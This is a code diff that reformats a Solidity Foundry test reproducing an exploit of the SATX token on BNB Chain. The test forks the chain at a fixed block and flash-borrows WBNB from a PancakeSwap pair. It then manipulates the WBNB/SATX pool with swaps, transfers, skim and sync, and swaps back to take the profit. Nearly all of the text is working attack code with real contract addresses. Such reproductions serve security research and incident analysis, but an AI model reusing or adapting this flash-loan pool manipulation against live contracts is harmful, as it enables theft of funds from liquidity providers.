@@ -20,9 +20,8 @@ contract ContractTest is Test {
     IPancakePair pair_WBNB_CAKE = IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
-    
     function setUp() public {
-        vm.createSelectFork("bsc", 37914434-1);
+        vm.createSelectFork("bsc", 37_914_434 - 1);
         vm.label(address(SATX), "SATX");
         vm.label(address(WBNB), "WBNB");
         vm.label(address(router), "PancakeSwap Router");
@@ -34,7 +33,7 @@ contract ContractTest is Test {
         SATX.approve(address(router), type(uint256).max);
         WBNB.approve(address(router), type(uint256).max);
     }
-    
+
     function testExploit() public {
         deal(attacker, 0.900000001 ether);
         WBNB.deposit{value: 0.9 ether}();
@@ -43,67 +42,40 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(SATX);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            1000000000000000,
-            0,
-            path,
-            attacker,
-            type(uint256).max
+            1_000_000_000_000_000, 0, path, attacker, type(uint256).max
         );
         uint256 SATX_amount = SATX.balanceOf(attacker);
         router.addLiquidity(
-            address(WBNB),
-            address(SATX),
-            1000000000000000,
-            SATX_amount,
-            0,
-            0,
-            attacker,
-            type(uint256).max
+            address(WBNB), address(SATX), 1_000_000_000_000_000, SATX_amount, 0, 0, attacker, type(uint256).max
         );
-        pair_WBNB_CAKE.swap(
-            0,
-            60000000000000000000,
-            attacker,
-            bytes("1")
-        );
+        pair_WBNB_CAKE.swap(0, 60_000_000_000_000_000_000, attacker, bytes("1"));
 
         uint256 WBNB_amount = WBNB.balanceOf(attacker);
         WBNB.withdraw(WBNB_amount);
     }
+
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
-        if(msg.sender == address(pair_WBNB_CAKE)){
+        if (msg.sender == address(pair_WBNB_CAKE)) {
             uint256 SATX_amount = SATX.balanceOf(address(pair_WBNB_SATX));
-            pair_WBNB_SATX.swap(
-                100000000000000,
-                SATX_amount/2,
-                attacker,
-                data
-            );
+            pair_WBNB_SATX.swap(100_000_000_000_000, SATX_amount / 2, attacker, data);
 
             uint256 SATX_amount_1 = SATX.balanceOf(attacker);
             SATX.transfer(address(pair_WBNB_SATX), SATX_amount_1);
             pair_WBNB_SATX.skim(attacker);
             pair_WBNB_SATX.sync();
-            WBNB.transfer(address(pair_WBNB_SATX), 100000000000000);
+            WBNB.transfer(address(pair_WBNB_SATX), 100_000_000_000_000);
             uint256 SATX_amount_2 = SATX.balanceOf(attacker);
             address[] memory path = new address[](2);
             path[0] = address(SATX);
             path[1] = address(WBNB);
             router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                SATX_amount_2,
-                0,
-                path,
-                attacker,
-                type(uint256).max
+                SATX_amount_2, 0, path, attacker, type(uint256).max
             );
-            WBNB.transfer(address(pair_WBNB_CAKE), 60150600000000000000);
-        }else if(msg.sender == address(pair_WBNB_SATX)){
-            WBNB.transfer(address(pair_WBNB_SATX), 52000000000000000000);
+            WBNB.transfer(address(pair_WBNB_CAKE), 60_150_600_000_000_000_000);
+        } else if (msg.sender == address(pair_WBNB_SATX)) {
+            WBNB.transfer(address(pair_WBNB_SATX), 52_000_000_000_000_000_000);
         }
-        
     }
 
     fallback() external payable {}
 }
-
-
